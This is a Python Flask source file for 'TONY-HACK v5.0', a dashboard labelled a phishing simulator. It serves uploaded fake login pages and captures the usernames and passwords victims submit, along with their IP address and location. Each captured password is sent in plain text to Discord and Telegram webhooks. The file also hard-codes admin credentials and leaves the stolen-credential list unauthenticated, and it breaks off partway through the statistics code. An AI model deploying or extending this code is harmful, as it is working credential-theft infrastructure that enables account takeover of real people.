#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════╗
║                    🔴 TONY-HACK v5.0                         ║
║                 PHISHING SIMULATOR DASHBOARD                 ║
║                    WRITTEN BY TONY                           ║
╚══════════════════════════════════════════════════════════════╝
"""

from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_from_directory, Response
from datetime import datetime
import os
import uuid
import json
import base64
import requests
import re
import time

# PostgreSQL - Version compatible Python 3.14
import psycopg2
from psycopg2.extras import RealDictCursor

# =====================================================
# CONFIGURATION
# =====================================================

ADMIN_USER = "admin"
ADMIN_PASS = "admin123"
ACCESS_CODE = "TONY2026"

DATABASE_URL = os.environ.get('DATABASE_URL', 'postgresql://localhost/tonyhack')

# =====================================================
# POSTGRESQL CONNEXION
# =====================================================

def get_db():
    return psycopg2.connect(DATABASE_URL, cursor_factory=RealDictCursor)

def init_db():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute('''
                    CREATE TABLE IF NOT EXISTS templates (
                        id TEXT PRIMARY KEY,
                        name TEXT,
                        type TEXT,
                        active BOOLEAN DEFAULT TRUE,
                        color TEXT DEFAULT '#e94560',
                        html_content TEXT,
                        created_at TIMESTAMP DEFAULT NOW()
                    )
                ''')
                cur.execute('''
                    CREATE TABLE IF NOT EXISTS credentials (
                        id TEXT PRIMARY KEY,
                        template_id TEXT,
                        username TEXT,
                        password TEXT,
                        ip TEXT,
                        user_agent TEXT,
                        target TEXT,
                        timestamp TIMESTAMP DEFAULT NOW()
                    )
                ''')
                cur.execute('''
                    CREATE TABLE IF NOT EXISTS settings (
                        key TEXT PRIMARY KEY,
                        value TEXT
                    )
                ''')
                cur.execute('''
                    CREATE TABLE IF NOT EXISTS webhooks (
                        id SERIAL PRIMARY KEY,
                        service TEXT,
                        url TEXT,
                        token TEXT,
                        chat_id TEXT,
                        name TEXT,
                        active BOOLEAN DEFAULT TRUE
                    )
                ''')
                cur.execute('''
                    CREATE TABLE IF NOT EXISTS campaign_stats (
                        id SERIAL PRIMARY KEY,
                        sent INTEGER DEFAULT 0,
                        success INTEGER DEFAULT 0,
                        failed INTEGER DEFAULT 0,
                        history JSONB DEFAULT '[]'
                    )
                ''')
                conn.commit()
    except Exception as e:
        print(f"DB Init Error: {e}")

init_db()

# =====================================================
# GÉOLOCALISATION
# =====================================================

class GeoLocator:
    def __init__(self):
        self.cache = {}
    def locate(self, ip):
        if ip in self.cache: return self.cache[ip]
        if ip in ['127.0.0.1', '::1'] or ip.startswith(('192.168.', '10.', '172.')):
            data = {'country': 'Local', 'country_code': '🏠', 'city': 'Local'}
        else:
            try:
                r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
                d = r.json()
                data = {'country': d.get('country', 'Unknown'), 'country_code': d.get('countryCode', '🌍'), 'city': d.get('city', 'Unknown')} if d.get('status') == 'success' else {'country': 'Unknown', 'country_code': '🌍', 'city': 'Unknown'}
            except:
                data = {'country': 'Unknown', 'country_code': '🌍', 'city': 'Unknown'}
        self.cache[ip] = data
        return data
    def format_location(self, data):
        flag = data.get('country_code', '🌍')
        return f"{flag} {data['city']}, {data['country']}" if data.get('city') != 'Unknown' else f"{flag} {data['country']}"

geo_locator = GeoLocator()

# =====================================================
# WEBHOOK MANAGER
# =====================================================

class WebhookManager:
    def __init__(self):
        self.webhooks = {'discord': [], 'telegram': []}
        self.load()
    def load(self):
        try:
            with get_db() as conn:
                with conn.cursor() as cur:
                    cur.execute("SELECT * FROM webhooks")
                    for w in cur.fetchall():
                        if w['service'] == 'discord':
                            self.webhooks['discord'].append({'id': w['id'], 'url': w['url'], 'name': w['name'], 'active': w['active']})
                        elif w['service'] == 'telegram':
                            self.webhooks['telegram'].append({'id': w['id'], 'token': w['token'], 'chat_id': w['chat_id'], 'name': w['name'], 'active': w['active']})
        except: pass
    def add_discord(self, url, name="Discord"):
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO webhooks (service, url, name) VALUES (%s, %s, %s)", ('discord', url, name))
                conn.commit()
        self.load()
    def add_telegram(self, token, chat_id, name="Telegram"):
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO webhooks (service, token, chat_id, name) VALUES (%s, %s, %s, %s)", ('telegram', token, chat_id, name))
                conn.commit()
        self.load()
    def remove(self, service, id):
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM webhooks WHERE service = %s AND id = %s", (service, id))
                conn.commit()
        self.load()
    def toggle(self, service, id):
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("UPDATE webhooks SET active = NOT active WHERE service = %s AND id = %s", (service, id))
                conn.commit()
        self.load()
    def send_discord(self, url, title, desc, fields=None):
        try:
            embed = {"title": title, "description": desc, "color": 0xe94560}
            if fields: embed["fields"] = fields
            r = requests.post(url, json={"embeds": [embed]}, timeout=5)
            return r.status_code == 204
        except: return False
    def send_telegram(self, token, chat_id, msg):
        try:
            r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"}, timeout=5)
            return r.json().get('ok', False)
        except: return False
    def notify(self, template, username, password, ip, location="🌍 Unknown"):
        for w in self.webhooks['discord']:
            if w['active']:
                self.send_discord(w['url'], "🔑 CREDENTIAL CAPTURÉ!", f"**{username}** sur **{template}**", fields=[{"name": "📧 Username", "value": username, "inline": True}, {"name": "🔐 Password", "value": f"||{password}||", "inline": True}, {"name": "🌐 IP", "value": ip, "inline": True}, {"name": "📍 Location", "value": location, "inline": True}])
        for w in self.webhooks['telegram']:
            if w['active']:
                self.send_telegram(w['token'], w['chat_id'], f"🔥 <b>NOUVEAU CREDENTIAL!</b>\n\n📧 {username}\n🔐 <code>{password}</code>\n🌐 {ip}\n📍 {location}\n🎯 {template}")
    def get_all(self):
        return self.webhooks

webhook_manager = WebhookManager()

# =====================================================
# FLASK
# =====================================================

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'tony-hack-secret')

@app.route('/')
def index():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template('dashboard/index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u = request.form.get('username')
        p = request.form.get('password')
        c = request.form.get('access_code')
        if u == ADMIN_USER and p == ADMIN_PASS and c == ACCESS_CODE:
            session['user'] = u
            return jsonify({'success': True, 'redirect': '/'})
        return jsonify({'success': False, 'message': 'Identifiants invalides'})
    return render_template('auth/login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/campaigns')
def campaigns():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template('dashboard/campaigns.html')

@app.route('/templates')
def templates():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template('dashboard/templates.html')

@app.route('/logs')
def logs():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template('dashboard/logs.html')

@app.route('/settings')
def settings():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template('dashboard/settings.html')

@app.route('/profile')
def profile():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template('auth/profile.html')

@app.route('/builder')
def builder():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template('dashboard/builder.html')

@app.route('/statistics')
def statistics():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template('dashboard/statistics.html')

# =====================================================
# API PUBLIC URL
# =====================================================

@app.route('/api/public-url')
def api_public_url():
    return jsonify({'url': request.host_url.rstrip('/')})

# =====================================================
# API SHORTENER
# =====================================================

@app.route('/api/shorten')
def shorten_url():
    url = request.args.get('url', '')
    try:
        r = requests.get(f'https://tinyurl.com/api-create.php?url={url}', timeout=5)
        return jsonify({'short_url': r.text.strip()})
    except:
        return jsonify({'short_url': url})

# =====================================================
# API TEMPLATES
# =====================================================

@app.route('/api/templates/list')
def api_templates_list():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT id, name, type, active, color FROM templates ORDER BY active DESC, name")
                templates = cur.fetchall()
        base_url = request.host_url.rstrip('/')
        for t in templates:
            t['url'] = f"{base_url}/t/{t['id']}"
        return jsonify(templates)
    except: return jsonify([])

@app.route('/api/templates/upload', methods=['POST'])
def upload_template():
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    f = request.files.get('file')
    if not f or not f.filename.endswith('.html'): return jsonify({'error': 'HTML requis'}), 400
    
    tid = str(uuid.uuid4())[:8]
    html_content = f.read().decode('utf-8')
    name = request.form.get('name', 'Template')
    ttype = request.form.get('type', 'custom')
    color = request.form.get('color', '#e94560')
    
    with get_db() as conn:
        with conn.cursor() as cur:
            cur.execute(
                "INSERT INTO templates (id, name, type, color, html_content) VALUES (%s, %s, %s, %s, %s)",
                (tid, name, ttype, color, html_content)
            )
            conn.commit()
    
    return jsonify({'success': True, 'template_id': tid, 'url': f"{request.host_url.rstrip('/')}/t/{tid}"})

@app.route('/api/templates/<tid>/update', methods=['POST'])
def update_template(tid):
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    d = request.get_json() or {}
    with get_db() as conn:
        with conn.cursor() as cur:
            if d.get('name'): cur.execute("UPDATE templates SET name = %s WHERE id = %s", (d['name'], tid))
            if d.get('type'): cur.execute("UPDATE templates SET type = %s WHERE id = %s", (d['type'], tid))
            if d.get('color'): cur.execute("UPDATE templates SET color = %s WHERE id = %s", (d['color'], tid))
            conn.commit()
    return jsonify({'success': True})

@app.route('/api/templates/<tid>/toggle', methods=['POST'])
def toggle_template(tid):
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    with get_db() as conn:
        with conn.cursor() as cur:
            cur.execute("UPDATE templates SET active = NOT active WHERE id = %s", (tid,))
            conn.commit()
    return jsonify({'success': True})

@app.route('/api/templates/<tid>', methods=['DELETE'])
def delete_template(tid):
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    with get_db() as conn:
        with conn.cursor() as cur:
            cur.execute("DELETE FROM templates WHERE id = %s", (tid,))
            conn.commit()
    return jsonify({'success': True})

@app.route('/t/<tid>')
def serve_template(tid):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT html_content, active FROM templates WHERE id = %s", (tid,))
                t = cur.fetchone()
        if not t: return "Template introuvable", 404
        if not t['active']: return "Template désactivé", 403
        return t['html_content']
    except: return "Erreur serveur", 500

# =====================================================
# API BUILDER
# =====================================================

@app.route('/api/builder/save', methods=['POST'])
def save_builder_template():
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    d = request.get_json() or {}
    tid = str(uuid.uuid4())[:8]
    html_content = d.get('html', '')
    name = d.get('name', 'Template Builder')
    
    with get_db() as conn:
        with conn.cursor() as cur:
            cur.execute(
                "INSERT INTO templates (id, name, type, color, html_content) VALUES (%s, %s, %s, %s, %s)",
                (tid, name, 'custom', '#e94560', html_content)
            )
            conn.commit()
    
    return jsonify({'success': True, 'template_id': tid, 'url': f"{request.host_url.rstrip('/')}/t/{tid}"})

# =====================================================
# API CAPTURE & LOGS
# =====================================================

@app.route('/api/capture', methods=['POST'])
def capture():
    d = request.get_json() if request.is_json else request.form.to_dict()
    ip = request.remote_addr
    ua = request.user_agent.string
    ref = request.args.get('ref', '')
    target = ''
    if ref:
        try: target = base64.b64decode(ref).decode('utf-8')
        except: target = ref
    
    cred_id = str(uuid.uuid4())[:8]
    template_id = d.get('template_id', 'unknown')
    username = d.get('email') or d.get('username') or ''
    password = d.get('pass') or d.get('password') or ''
    
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO credentials (id, template_id, username, password, ip, user_agent, target) VALUES (%s, %s, %s, %s, %s, %s, %s)",
                    (cred_id, template_id, username, password, ip, ua, target)
                )
                conn.commit()
        
        loc = geo_locator.locate(ip)
        location = geo_locator.format_location(loc)
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT name FROM templates WHERE id = %s", (template_id,))
                t = cur.fetchone()
        template_name = t['name'] if t else template_id
        webhook_manager.notify(template_name, username, password, ip, location)
    except: pass
    
    return jsonify({'success': True})

@app.route('/api/logs/list')
def api_logs_list():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("""
                    SELECT c.*, t.name as template_name 
                    FROM credentials c 
                    LEFT JOIN templates t ON c.template_id = t.id 
                    ORDER BY c.timestamp DESC
                """)
                logs = cur.fetchall()
        
        for log in logs:
            try:
                loc = geo_locator.locate(log['ip'])
                log['location'] = geo_locator.format_location(loc)
            except:
                log['location'] = "🌍 Unknown"
        
        return jsonify(logs)
    except: return jsonify([])

@app.route('/api/logs/clear', methods=['POST'])
def clear_logs():
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    with get_db() as conn:
        with conn.cursor() as cur:
            cur.execute("DELETE FROM credentials")
            conn.commit()
    return jsonify({'success': True})

@app.route('/api/logs/export/pdf')
def export_logs_pdf():
    if 'user' not in session: return redirect(url_for('login'))
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT * FROM credentials ORDER BY timestamp DESC LIMIT 100")
                logs = cur.fetchall()
        txt = "TONY-HACK - RAPPORT\n" + "="*50 + "\n"
        for c in logs:
            txt += f"{c['username']} | {c['ip']} | {c['timestamp']}\n"
        return Response(txt, mimetype="text/plain", headers={"Content-disposition": "attachment; filename=rapport.txt"})
    except: return "Erreur", 500

# =====================================================
# API STATISTIQUES AVANCÉES
# =====================================================

@app.route('/api/statistics/advanced')
def api_statistics_advanced():
    if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT * FROM credentials")
                creds = cur.fetchall()
        
        countries = {}
        browsers = {}
        os_data = {}
        hourly = {str(h).zfill(2): 0 for h in range(24)}
        
        for c in creds:
            ip = c['ip']
            if ip and ip != '127.0.0.1':
                loc = geo_locator.locate(ip)
                country = loc.get('country', 'Unknown')
                countries[country] = countries.get(country, 0) + 1
            
            ua = c.get('user_agent', '')
            if ua:
                if 'Chrome' in ua and 'Edg' not in ua: browser = 'Chrome'
                elif 'Firefox' in ua: browser = 'Firefox'
                elif 'Safari' in ua and 'Chrome' not in ua: browser = 'Safari'
                elif 'Edg' in ua: browser = 'Edge'
                else: browser = 'Autre'
                browsers[browser] = browsers.get(browser, 0) + 1
                
                if 'Windows' in ua: os_name = 'Windows'
                elif 'Mac' in ua: os_name = 'macOS'
                elif 'Android' in ua: os_name = 'Android'
                elif 'iPhone' in ua or 'iPad' in ua: os_name = 'iOS'
                else: os_name = 'Autre'
                os_data[os_name] = os_data.get(os_name, 0) + 1
            
            ts = c.get('timestamp')
